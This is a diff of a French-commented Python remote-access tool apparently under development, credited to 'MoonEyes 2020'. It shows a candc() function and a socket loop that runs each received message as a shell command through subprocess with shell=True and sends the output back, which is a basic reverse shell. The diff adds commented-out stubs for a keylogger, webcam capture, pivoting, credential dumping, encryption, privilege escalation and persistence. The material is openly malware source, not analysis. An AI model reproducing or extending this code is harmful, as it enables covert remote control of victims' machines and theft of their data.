@@ -1,3 +1,5 @@
+##Droit d'auteur crée par MoonEyes 2020
+
 import subprocess
 import sys
 import os
@@ -79,10 +81,19 @@ def candc():
 
 #écrire dans le profile pour persistant
 #def persistant():
+##def  Keylogger():
+##def webcam():
+##def pivoting():
+##def dump():
+##def video():
+##def crypt():
+##def nmap():
+    ##download package and scan réseaux
+##def popup():
+##def popuptexte():
+##def privilege():
+##def logs():    
 
-
-
-## Keylogger
 
 
 mon_socket = s.socket(s.AF_INET,s.SOCK_STREAM)
@@ -107,8 +118,6 @@ while message != "exit":
         mon_socket.send(process.stdout.read()+process.stderr.read())
 
     #if message = "persistant":
-
-
     else:
         #print(message)
         process = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
